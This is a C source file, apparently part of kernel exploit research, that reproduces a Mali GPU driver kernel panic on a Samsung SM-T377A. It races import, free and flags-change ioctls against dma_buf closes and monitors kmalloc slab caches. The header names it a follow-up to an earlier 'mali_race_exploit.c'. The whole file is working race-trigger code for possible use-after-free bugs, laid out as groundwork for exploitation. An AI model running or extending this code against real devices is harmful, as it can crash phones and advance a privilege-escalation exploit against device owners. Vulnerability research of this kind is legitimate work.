/*
 * mali_race_repro.c — Reproduce Mali kernel panic from mali_race_exploit.c
 *
 * Tests 1-6 completed cleanly. Test 7 (MEM_IMPORT + ION free race)
 * was starting when the device kernel-panicked. This tool runs ONLY
 * Test 7 and Test 8 individually with slab monitoring to identify
 * which race caused the panic and characterize the crash.
 *
 * TEST A: MEM_IMPORT + ION close race (suspected crash cause)
 *   Thread 1: Import ION dma_buf fd into Mali
 *   Thread 2: close(dma_buf_fd) while import is in progress
 *   This is a classic fd lifecycle race — if close() runs during
 *   kbase_mem_import(), the dma_buf ref may be dropped mid-operation.
 *
 * TEST B: MEM_QUERY + MEM_FREE race (info leak)
 *   Thread 1: MEM_QUERY on live region
 *   Thread 2: MEM_FREE + re-ALLOC
 *
 * TEST C: Isolated MEM_IMPORT stress (no race, baseline)
 *
 * TEST D: MEM_FREE + FLAGS_CHANGE with slab monitoring
 *
 * Build: arm-linux-gnueabi-gcc -static -pie -fPIE -o mali_race_repro mali_race_repro.c -lpthread
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>

#define DEV_PATH "/dev/mali0"

#define KBASE_FUNC_VERSION_CHECK     0
#define KBASE_FUNC_MEM_ALLOC         512
#define KBASE_FUNC_MEM_IMPORT        513
#define KBASE_FUNC_MEM_QUERY         515
#define KBASE_FUNC_MEM_FREE          516
#define KBASE_FUNC_MEM_FLAGS_CHANGE  517
#define KBASE_FUNC_SET_FLAGS         530

#define BASE_MEM_PROT_CPU_RD     (1U << 0)
#define BASE_MEM_PROT_CPU_WR     (1U << 1)
#define BASE_MEM_PROT_GPU_RD     (1U << 2)
#define BASE_MEM_PROT_GPU_WR     (1U << 3)
#define STD_FLAGS (BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR | \
                   BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR)

#define MALI_ERROR_NONE 0

struct uk_header { uint32_t id; uint32_t ret; };

static unsigned int make_cmd(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, sz);
}

static int mali_open_ctx(void) {
    int fd = open(DEV_PATH, O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;
    uint8_t hb[16];
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = KBASE_FUNC_VERSION_CHECK;
    hb[8] = 10;
    if (ioctl(fd, make_cmd(16), hb) < 0) { close(fd); return -1; }
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = KBASE_FUNC_SET_FLAGS;
    if (ioctl(fd, make_cmd(16), hb) < 0) { close(fd); return -1; }
    return fd;
}

static uint64_t mali_alloc(int fd, uint32_t pages, uint64_t flags) {
    uint8_t buf[56];
    memset(buf, 0, 56);
    ((struct uk_header*)buf)->id = KBASE_FUNC_MEM_ALLOC;
    *(uint64_t*)(buf + 8)  = pages;
    *(uint64_t*)(buf + 16) = pages;
    *(uint64_t*)(buf + 32) = flags;
    if (ioctl(fd, make_cmd(56), buf) < 0) return 0;
    if (((struct uk_header*)buf)->id != MALI_ERROR_NONE) return 0;
    return *(uint64_t*)(buf + 40);
}

static int mali_free(int fd, uint64_t va) {
    uint8_t buf[16];
    memset(buf, 0, 16);
    ((struct uk_header*)buf)->id = KBASE_FUNC_MEM_FREE;
    *(uint64_t*)(buf + 8) = va;
    int r = ioctl(fd, make_cmd(16), buf);
    return (r == 0 && ((struct uk_header*)buf)->id == MALI_ERROR_NONE) ? 0 : -1;
}

static int mali_import(int fd, int dma_buf_fd, uint64_t *out_va) {
    uint8_t buf[48];
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = KBASE_FUNC_MEM_IMPORT;
    *(uint64_t*)(buf + 8) = (uint64_t)dma_buf_fd;
    *(uint64_t*)(buf + 16) = 1;  /* type = UMM (dma-buf) */
    int r = ioctl(fd, make_cmd(48), buf);
    if (r == 0 && ((struct uk_header*)buf)->id == MALI_ERROR_NONE) {
        if (out_va) *out_va = *(uint64_t*)(buf + 32);
        return 0;
    }
    return -1;
}

static int ion_alloc_fd(int ion_fd) {
    struct {
        uint64_t len;
        uint64_t align;
        uint32_t heap_id_mask;
        uint32_t flags;
        int32_t  fd;
    } data = { .len = 4096, .align = 4096, .heap_id_mask = 1, .flags = 0, .fd = -1 };

    if (ioctl(ion_fd, 0xc0144900, &data) == 0 && data.fd >= 0)
        return data.fd;
    return -1;
}

static volatile int g_go = 0;
static volatile int g_stop = 0;
static int g_mali_fd = -1;

static void wait_go(void) { while (!g_go) { } }

static void read_slab(const char *label, const char *cache) {
    char cmd[256];
    snprintf(cmd, sizeof(cmd),
        "grep '%s ' /proc/slabinfo 2>/dev/null | awk '{print \"%s: \" $1 \" active=\" $2 \" total=\" $3}'",
        cache, label);
    system(cmd);
}

/* ====================================================================== */
/* TEST A: MEM_IMPORT + close(dma_buf_fd) race                            */
/* ====================================================================== */
static volatile int ta_import_ok = 0;
static volatile int ta_import_fail = 0;
static volatile int ta_ion_fd_shared = -1;

static void *ta_import_thread(void *arg) {
    (void)arg;
    wait_go();
    for (int i = 0; i < 2000 && !g_stop; i++) {
        int dma_fd = ta_ion_fd_shared;
        if (dma_fd < 0) { usleep(10); continue; }
        uint64_t gpu_va = 0;
        int r = mali_import(g_mali_fd, dma_fd, &gpu_va);
        if (r == 0) {
            __sync_fetch_and_add(&ta_import_ok, 1);
            mali_free(g_mali_fd, gpu_va);
        } else {
            __sync_fetch_and_add(&ta_import_fail, 1);
        }
    }
    return NULL;
}

static void *ta_ion_close_thread(void *arg) {
    int ion_fd = (int)(intptr_t)arg;
    wait_go();
    for (int i = 0; i < 2000 && !g_stop; i++) {
        int dma_fd = ion_alloc_fd(ion_fd);
        if (dma_fd < 0) continue;
        ta_ion_fd_shared = dma_fd;
        /* Tiny window then close */
        usleep(5);
        ta_ion_fd_shared = -1;
        close(dma_fd);
    }
    return NULL;
}

static void test_a_import_race(int iterations) {
    fprintf(stderr, "\n=== TEST A: MEM_IMPORT + close(dma_buf) race ===\n");
    fprintf(stderr, "  %d iterations, 2000 ops each\n", iterations);

    int crashes = 0;
    for (int trial = 0; trial < iterations; trial++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(10);
            g_mali_fd = mali_open_ctx();
            int ion_fd = open("/dev/ion", O_RDONLY | O_CLOEXEC);
            if (g_mali_fd < 0 || ion_fd < 0) _exit(1);

            ta_import_ok = 0; ta_import_fail = 0; ta_ion_fd_shared = -1;
            g_go = 0; g_stop = 0;

            pthread_t t_import, t_close;
            pthread_create(&t_import, NULL, ta_import_thread, NULL);
            pthread_create(&t_close, NULL, ta_ion_close_thread, (void*)(intptr_t)ion_fd);

            usleep(1000);
            g_go = 1;

            pthread_join(t_import, NULL);
            pthread_join(t_close, NULL);

            fprintf(stderr, "  [%d] import_ok=%d fail=%d\n",
                    trial, ta_import_ok, ta_import_fail);
            close(ion_fd);
            close(g_mali_fd);
            _exit(0);
        }
        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            fprintf(stderr, "  [%d] KILLED by signal %d *** CRASH ***\n",
                    trial, WTERMSIG(status));
            crashes++;
        } else if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
            if (WEXITSTATUS(status) == 14)
                fprintf(stderr, "  [%d] TIMEOUT *** HANG ***\n", trial);
            crashes++;
        }
    }
    fprintf(stderr, "  RESULT: %d crashes/hangs in %d trials\n", crashes, iterations);
}

/* ====================================================================== */
/* TEST B: MEM_IMPORT with dup(dma_buf_fd) — keep ref alive               */
/* ====================================================================== */
static volatile int tb_import_ok = 0;

static void *tb_import_dup_thread(void *arg) {
    (void)arg;
    wait_go();
    for (int i = 0; i < 2000 && !g_stop; i++) {
        int dma_fd = ta_ion_fd_shared;
        if (dma_fd < 0) { usleep(10); continue; }
        /* dup the fd to keep it alive even if other thread closes */
        int dup_fd = dup(dma_fd);
        if (dup_fd < 0) continue;
        uint64_t gpu_va = 0;
        int r = mali_import(g_mali_fd, dup_fd, &gpu_va);
        if (r == 0) {
            __sync_fetch_and_add(&tb_import_ok, 1);
            mali_free(g_mali_fd, gpu_va);
        }
        close(dup_fd);
    }
    return NULL;
}

static void test_b_import_dup_race(int iterations) {
    fprintf(stderr, "\n=== TEST B: MEM_IMPORT + close race (with dup) ===\n");
    fprintf(stderr, "  Same as A but import thread dups fd first (control test)\n");

    int crashes = 0;
    for (int trial = 0; trial < iterations; trial++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(10);
            g_mali_fd = mali_open_ctx();
            int ion_fd = open("/dev/ion", O_RDONLY | O_CLOEXEC);
            if (g_mali_fd < 0 || ion_fd < 0) _exit(1);

            tb_import_ok = 0; ta_ion_fd_shared = -1;
            g_go = 0; g_stop = 0;

            pthread_t t_import, t_close;
            pthread_create(&t_import, NULL, tb_import_dup_thread, NULL);
            pthread_create(&t_close, NULL, ta_ion_close_thread, (void*)(intptr_t)ion_fd);

            usleep(1000);
            g_go = 1;

            pthread_join(t_import, NULL);
            pthread_join(t_close, NULL);

            fprintf(stderr, "  [%d] import_ok=%d\n", trial, tb_import_ok);
            close(ion_fd);
            close(g_mali_fd);
            _exit(0);
        }
        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            fprintf(stderr, "  [%d] KILLED by signal %d *** CRASH ***\n",
                    trial, WTERMSIG(status));
            crashes++;
        }
    }
    fprintf(stderr, "  RESULT: %d crashes in %d trials\n", crashes, iterations);
}

/* ====================================================================== */
/* TEST C: MEM_IMPORT stress (no race, baseline)                          */
/* ====================================================================== */
static void test_c_import_baseline(void) {
    fprintf(stderr, "\n=== TEST C: MEM_IMPORT stress (no race, baseline) ===\n");

    pid_t pid = fork();
    if (pid == 0) {
        alarm(15);
        int mali_fd = mali_open_ctx();
        int ion_fd = open("/dev/ion", O_RDONLY | O_CLOEXEC);
        if (mali_fd < 0 || ion_fd < 0) _exit(1);

        int ok = 0, fail = 0;
        for (int i = 0; i < 500; i++) {
            int dma_fd = ion_alloc_fd(ion_fd);
            if (dma_fd < 0) { fail++; continue; }

            uint64_t gpu_va = 0;
            int r = mali_import(mali_fd, dma_fd, &gpu_va);
            if (r == 0) {
                ok++;
                mali_free(mali_fd, gpu_va);
            } else {
                fail++;
            }
            close(dma_fd);
        }
        fprintf(stderr, "  import_ok=%d fail=%d\n", ok, fail);
        close(ion_fd);
        close(mali_fd);
        _exit(0);
    }
    int status;
    waitpid(pid, &status, 0);
    if (WIFSIGNALED(status))
        fprintf(stderr, "  KILLED by signal %d *** CRASH ***\n", WTERMSIG(status));
    else
        fprintf(stderr, "  Baseline OK\n");
}

/* ====================================================================== */
/* TEST D: Slab monitoring during MEM_FREE + FLAGS_CHANGE race            */
/* ====================================================================== */
static volatile uint64_t td_target_va = 0;
static volatile int td_fc_ok = 0;

static void *td_flags_thread(void *arg) {
    (void)arg;
    wait_go();
    for (int i = 0; i < 5000 && !g_stop; i++) {
        uint64_t va = td_target_va;
        uint8_t buf[32];
        memset(buf, 0, 32);
        ((struct uk_header*)buf)->id = KBASE_FUNC_MEM_FLAGS_CHANGE;
        *(uint64_t*)(buf + 8)  = va;
        *(uint64_t*)(buf + 16) = STD_FLAGS;
        *(uint64_t*)(buf + 24) = STD_FLAGS;
        int r = ioctl(g_mali_fd, make_cmd(32), buf);
        if (r == 0 && ((struct uk_header*)buf)->id == 0)
            __sync_fetch_and_add(&td_fc_ok, 1);
    }
    return NULL;
}

static void *td_free_alloc_thread(void *arg) {
    (void)arg;
    wait_go();
    for (int i = 0; i < 5000 && !g_stop; i++) {
        uint64_t va = td_target_va;
        mali_free(g_mali_fd, va);
        uint64_t new_va = mali_alloc(g_mali_fd, 1, STD_FLAGS);
        if (new_va) td_target_va = new_va;
    }
    return NULL;
}

static void test_d_flags_slab(void) {
    fprintf(stderr, "\n=== TEST D: FLAGS_CHANGE + FREE race with slab monitoring ===\n");

    read_slab("PRE", "kmalloc-128");
    read_slab("PRE", "kmalloc-256");

    for (int trial = 0; trial < 5; trial++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(8);
            g_mali_fd = mali_open_ctx();
            if (g_mali_fd < 0) _exit(1);
            td_target_va = mali_alloc(g_mali_fd, 1, STD_FLAGS);
            if (!td_target_va) _exit(1);

            td_fc_ok = 0;
            g_go = 0; g_stop = 0;

            pthread_t t_flags, t_free;
            pthread_create(&t_flags, NULL, td_flags_thread, NULL);
            pthread_create(&t_free, NULL, td_free_alloc_thread, NULL);

            usleep(1000);
            g_go = 1;

            pthread_join(t_flags, NULL);
            pthread_join(t_free, NULL);

            fprintf(stderr, "  [%d] fc_ok=%d\n", trial, td_fc_ok);
            close(g_mali_fd);
            _exit(0);
        }
        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            fprintf(stderr, "  [%d] KILLED by signal %d *** CRASH ***\n",
                    trial, WTERMSIG(status));
    }

    read_slab("POST", "kmalloc-128");
    read_slab("POST", "kmalloc-256");
}

int main(int argc, char **argv) {
    fprintf(stderr, "=== Mali Race Crash Reproduction ===\n");
    fprintf(stderr, "SM-T377A kernel 3.10.9 | Identifying which race caused kernel panic\n");
    fprintf(stderr, "PID=%d UID=%d\n\n", getpid(), getuid());

    /* Parse args: which test to run */
    char test = 'A';  /* default: suspected crash cause */
    int iterations = 3;
    if (argc >= 2) test = argv[1][0];
    if (argc >= 3) iterations = atoi(argv[2]);

    /* Quick sanity */
    int fd = mali_open_ctx();
    if (fd < 0) {
        fprintf(stderr, "[-] Cannot open /dev/mali0: %s\n", strerror(errno));
        return 1;
    }
    close(fd);
    fprintf(stderr, "[+] Mali context OK\n");

    /* Pre-test dmesg baseline */
    fprintf(stderr, "\n--- Pre-test dmesg ---\n");
    system("dmesg 2>/dev/null | tail -3 | grep -iE 'mali|kbase' 2>/dev/null");

    switch (test) {
        case 'A': case 'a':
            test_a_import_race(iterations);
            break;
        case 'B': case 'b':
            test_b_import_dup_race(iterations);
            break;
        case 'C': case 'c':
            test_c_import_baseline();
            break;
        case 'D': case 'd':
            test_d_flags_slab();
            break;
        case '*':
            /* Run all tests */
            test_c_import_baseline();
            test_b_import_dup_race(iterations);
            test_d_flags_slab();
            /* Run the dangerous one LAST */
            fprintf(stderr, "\n*** Running suspected crash test (A) last ***\n");
            test_a_import_race(iterations);
            break;
        default:
            fprintf(stderr, "Usage: %s [A|B|C|D|*] [iterations]\n", argv[0]);
            fprintf(stderr, "  A = MEM_IMPORT + close race (suspected crash)\n");
            fprintf(stderr, "  B = MEM_IMPORT + close with dup (control)\n");
            fprintf(stderr, "  C = MEM_IMPORT baseline (no race)\n");
            fprintf(stderr, "  D = FLAGS_CHANGE + FREE with slab monitor\n");
            fprintf(stderr, "  * = All tests\n");
            return 1;
    }

    fprintf(stderr, "\n--- Post-test dmesg ---\n");
    system("dmesg 2>/dev/null | tail -10 | grep -iE 'mali|kbase|oops|bug|panic|fault' 2>/dev/null");

    fprintf(stderr, "\n=== Done ===\n");
    return 0;
}
